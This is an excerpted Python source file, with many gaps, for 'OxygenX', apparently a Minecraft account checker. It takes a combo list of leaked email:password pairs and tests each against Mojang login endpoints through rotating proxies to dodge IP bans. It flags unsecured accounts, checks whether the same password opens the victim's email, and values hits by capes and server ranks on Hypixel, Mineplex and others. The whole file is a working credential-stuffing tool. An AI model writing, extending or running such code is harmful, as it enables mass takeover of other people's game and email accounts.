...
OxygenX:
  ...
  proxy:
    ...
    proxy: true
    # If proxies be used for checking sfas (Will sometimes be slower but if false, you may get ip banned)
    proxy_for_sfa: true
...
class Main:
    def __init__(self):
        ...
        # Others
        self.liquidlink = f'https://raw.githubusercontent.com/CCBlueX/FileCloud/master/LiquidBounce/cape/service.json'
        self.stop_time = True
        self.mailheaders = {
        ...
        self.t = f'''{self.cyan}________                                     ____  ___
\_____  \ ___  ______.__. ____   ____   ____ \   \/  /
 /   |   \\\  \/  <   |  |/ ___\_/ __ \ /    \ \     /
/    |    \>    < \___  / /_/  >  ___/|   |  \/     \\
\_______  /__/\_ \/ ____\___  / \___  >___|  /___/\  \\
...
\n'''
        ...
        try:
            ...
            colorin = self.announcement.split('Color: ')[1].lower()
            if colorin == 'red\n':
                color = self.red
            elif colorin == 'white\n':
                ...
                color = self.cyan
            elif colorin == 'magenta\n':
                color = Fore.LIGHTMAGENTA_EX
            elif colorin == 'yellow\n':
                color = Fore.LIGHTYELLOW_EX
        except Exception as e:
            if self.debug:
                print(f'{self.red}Error with announcement: {e}')
            self.announcement = ''
            pass

        print(self.t)
        if OxygenX.Proxy.proxy and not OxygenX.Proxy.proxy_use_api:
            print('Please Import Your Proxy List...')
            sleep(0.3)
            proxylistloader = fileopenbox(title="Import Your Proxy list", default="*.txt")
            print(f'Imported Proxy list from {proxylistloader}\n')
            self.proxylist = open(proxylistloader, 'r', encoding='u8', errors='ignore').read().split('\n')
            ...
            while True:
                try:
                    ...
                    if self.debug:
                        print(f'{self.red}Error connecting with api link: {e}\n')
                    print(
                        f'{self.red}Proxy Api link down or Connection Error\nPlease check your connection or make sure you entered the correct api link\n\nClosing program in 6 seconds...')
                    sleep(6)
                    exit()
        print('Please Import Your Combo List...')
        sleep(0.3)
        combolistloader = fileopenbox(title="Import Your Combo list", default="*.txt")
        print(f'Imported Combo list from {combolistloader}')
        self.combolist = open(f"{combolistloader}", "r", errors="ignore", encoding="u8").read().split('\n')
        print(f'\nStarting Threads...')
        ...
        print(self.t)
        print(f'{color}{self.announcement.split("Color: ")[0]}')
        pool.map(func=self.prep, iterable=self.accounts)
        pool.close()
        pool.join()
        while True:
            if int(self.printing.qsize() and self.caputer.qsize() and self.bad.qsize() and self.hits.qsize()) == 0:
                ...
                print(f'{self.green}\n\nResults: \n\n'
                      ...
                      f'Mojang capes: {Counter.mojang}\n'
                      f'Optifine capes: {Counter.optifine}\n'
                      f'Labymod capes: {Counter.labymod}\n'
                      f'LiquidBounce capes: {Counter.liquidbounce}\n'
                      ...
                      f'Hypixel {OxygenX.Level.hypixel_level}+ accounts: {Counter.hypixelhl}\n'
                      f'Mineplex {OxygenX.Level.mineplex_level}+ accounts: {Counter.mineplexhl}\n'
                      f'Speed: {self.blue}{round((time() - self.start_time) / Counter.checked, 3)}s/account'
                      f'\n{self.green}Total time checking: {self.blue}{self.now_time()}'
                      f'\n{Fore.LIGHTMAGENTA_EX}Finish checking\n{self.red}')
        ...
        try:
            ...
            if str(texta).__contains__("errorMessage"):
                ...
                if OxygenX.print_bad:
                    self.printing.put(f'{self.red}[Bad] {self.blue}- {self.red}{line}')
            elif str(texta).__contains__('[]'):
                self.printing.put(f'{Fore.LIGHTYELLOW_EX}[Demo] {self.blue}- {Fore.LIGHTYELLOW_EX}{line}')
                Counter.demo += 1
                ...
                if str(ajson).__contains__("'legacy': True") or (
                        OxygenX.unmigrated and str(ajson).__contains__("'legacy': True")):
                    Counter.unfa += 1
                    self.printing.put(
                        f'{Fore.LIGHTMAGENTA_EX}[Unmigrated]{self.blue} - {self.green}{line}')
                ...
                if dosfa or not OxygenX.unmigrated:
                    ...
                    if securec == '[]':
                        Counter.sfa += 1
                        self.printing.put(
                            f'{self.cyan}[Unsecured]{self.blue} - {self.green}{line}{self.blue} | {self.green}Username: {username}')
                        sfa = True
                        data.append('\nUnsecured: True')
                    else:
                        Counter.nfa += 1
                        self.printing.put(
                            f'{self.green}[Secured]{self.blue} - {self.green}{line}{self.blue} | {self.green}Username: {username}')
                Counter.hits += 1
                ...
                with ThreadPoolExecutor() as exe:
                    ...
                    mailaccess = exe.submit(self.mailaccess, original_email, password).result()
            ...
            if self.debug:
                self.printing.put(f'{self.red}[Error] {line} \nError: {e}')
            if self.savebad:
                self.bad.put(line)
            Counter.bad += 1
    ...
    def securedcheck(self, token):
        ...
        try:
            if not OxygenX.Proxy.proxy or not OxygenX.Proxy.proxy_for_sfa:
                lol = get(url=self.secureurl, headers=headers).text
            else:
                while True:
                    try:
    ...
    def prints(self):
        while True:
            while self.printing.qsize() != 0:
                print(f'{self.blue}{self.now_time()} {self.printing.get()}')
                sleep(0.008)
    ...
    def optifine(self, user, combo):
        ...
        if OxygenX.Cape.optifine:
            try:
                ...
                if self.debug:
                    self.printing.put(f'{self.red}Error Optifine:\n{e}')
            if cape:
                Counter.optifine += 1
    ...
    def mojang(self, uuid, combo, user):
        ...
        if OxygenX.Cape.mojang:
            try:
                mine = get(url=f'https://crafatar.com/capes/{uuid}').text.lower()
                if mine.__contains__('png'):
                    cape = True
            except Exception as e:
                if self.debug:
                    self.printing.put(f'{self.red}Error MojangCape:\n{e}')
            if cape:
                Counter.mojang += 1
    ...
    def labymod(self, uuid, combo, user):
        ...
        if OxygenX.Cape.labymod:
            ...
            try:
                ...
                if self.debug:
                    self.printing.put(f'{self.red}Error Labymod:\n{e}')
            if cape:
                Counter.labymod += 1
    ...
    def liquidbounce(self):
        try:
            lbc = get(url=self.liquidlink).text
            return lbc
        except Exception as e:
            if self.debug:
                self.printing.put(f'{self.red}Error LiquidBounce:\n{e}')
            return False
    ...
    def hivemc(self, uuid, combo):
        ...
        if OxygenX.Rank.hivemc_rank:
            try:
                ...
                if self.debug:
                    self.printing.put(f'{self.red}Error HiveMC:\n{e}')
            if rank:
    ...
    def mineplex(self, username, combo):
        ...
        if self.mpr or self.mpl:
            try:
                ...
                if self.debug:
                    self.printing.put(f'{self.red}Error Mineplex:\n{e}')
            if both[0]:
    ...
    def hypixel(self, uuid, combo):
        ...
        if self.hypr or self.hypl:
            try:
                ...
                if self.debug:
                    self.printing.put(f'{self.red}Slothpixel API Error: \n{e}')
            if not both[2]:
                if both[0] != 'None':
    ...
    def veltpvp(self, username, combo):
        ...
        if OxygenX.Rank.veltpvp_rank:
            try:
                ...
                if self.debug:
                    self.printing.put(f'{self.red}Error Veltpvp:\n{e}')
            if rank:
    ...
    def mailaccess(self, email, password):
        ...
        if OxygenX.emailaccess:
            try:
                ...
                if self.debug:
                    self.printing.put(f'{self.red}Error Mail Access: \n{e}')
                ans = 'BAD'
            if 'Ok=1' in ans:
                mailaccesz = True
    ...
    def refresh_api_link(self):
        while True:
            try:
                ...
                if self.debug:
                    print(f'{self.red}Refreshing API link error: {e}')
                continue
